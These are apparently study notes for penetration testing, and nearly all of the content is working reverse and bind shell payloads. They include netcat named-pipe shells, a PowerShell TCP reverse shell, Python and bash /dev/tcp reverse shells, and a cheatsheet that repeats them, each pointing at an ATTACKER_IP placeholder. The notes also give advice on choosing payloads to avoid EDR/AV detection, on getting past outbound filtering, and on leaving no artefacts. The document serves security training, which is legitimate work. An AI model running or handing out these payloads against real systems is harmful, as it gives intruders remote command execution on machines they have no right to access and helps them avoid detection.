# 🔁 Reverse & Bind Shells — Study Notes

## Netcat Without the `-e` Flag

Many modern Linux distros (especially OpenBSD netcat) **remove the `-e` flag** for security reasons.  
**Workaround:** Use a **named pipe (FIFO)** to recreate the same circular data flow.

### How it works
```
netcat ──► named pipe ──► /bin/sh ──► named pipe ──► netcat
```

### Bind Shell (no `-e`)
```bash
# Run on TARGET
mkfifo /tmp/f; nc -lvnp 8080 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

| Flag | Meaning |
|------|---------|
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-n` | Skip DNS resolution |
| `-p 8080` | Listen on port 8080 |

### Reverse Shell (no `-e`)
```bash
# Run on TARGET
mkfifo /tmp/f; nc ATTACKER_IP 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

> ✅ Both commands auto-remove `/tmp/f` on disconnect — no artefacts left behind.

---

## PowerShell Reverse Shell (Windows)

Useful when traditional tools are restricted. Uses .NET's TCP socket classes — **no binary uploads needed**.

```powershell
# Run on TARGET
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()"
```

**How it works:**
1. Opens TCP connection to attacker machine
2. Reads commands from the stream
3. Executes via `Invoke-Expression` (`iex`)
4. Sends output + PS prompt back through the same connection

---

## Script-Based Shells (Linux)

Useful when traditional tools are missing — exploit pre-installed scripting languages.

### Python Reverse Shell
```bash
python3 -c 'import socket,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("ATTACKER_IP",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty; pty.spawn("/bin/bash")'
```
- Creates socket connection
- Duplicates socket fd → stdin, stdout, stderr
- Spawns bash with pseudo-terminal (PTY) for interactivity

### Bash TCP Reverse Shell
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```
- Uses bash's built-in `/dev/tcp` pseudo-device
- Requires bash compiled with `--enable-net-redirections`
- May not work on minimal Linux installs

---

## Payload Selection Strategy

| Factor | Consideration |
|--------|--------------|
| **Target OS** | Windows → PowerShell; Linux → bash/Python/netcat |
| **Available tools** | Check for Python, Perl, Ruby, PHP — all have networking capabilities |
| **Network restrictions** | Try different ports if outbound connections are filtered |
| **Execution context** | Web shells / scheduled tasks may have different privileges |
| **Detection concerns** | PowerShell is heavily monitored on modern Windows (EDR/AV) |

---

## Useful Resources

- 📦 **PayloadsAllTheThings** — comprehensive shell payload cheat sheet (Python, Perl, Ruby, PHP, Java, and more)  
  `https://github.com/swisskyrepo/PayloadsAllTheThings`

---

## Quick Reference Cheatsheet

```bash
# Netcat bind (with -e)
nc -lvnp 4444 -e /bin/bash

# Netcat bind (without -e, named pipe)
mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# Netcat reverse (without -e)
mkfifo /tmp/f; nc ATTACKER_IP 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# Bash TCP
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash")'
```

---

> ⚠️ **For authorized penetration testing and educational purposes only.**  
> Always test payloads in a controlled environment before use.
